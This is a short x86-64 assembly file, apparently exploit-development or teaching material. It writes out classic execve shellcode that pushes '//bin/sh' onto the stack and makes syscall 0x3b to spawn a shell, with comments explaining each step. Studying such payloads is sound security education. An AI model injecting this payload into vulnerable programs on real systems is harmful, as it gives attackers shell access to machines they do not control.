.text

.global _start
_start:
  xor %rax, %rax                # nullify %rax
  pushq %rax
  movq $0x68732f6e69622f2f, %rax # "hs/nib/" --> %rax
  pushq %rax                    # push the sh command onto the stack

  xor %rax, %rax
  addq $0x3b, %rax              # execve (
  movq  %rsp, %rdi              #         /bin/sh ,
  xor   %rsi, %rsi              #         NULL ,
  xor   %rdx, %rdx              #         NULL
                                #        )
  syscall

.data
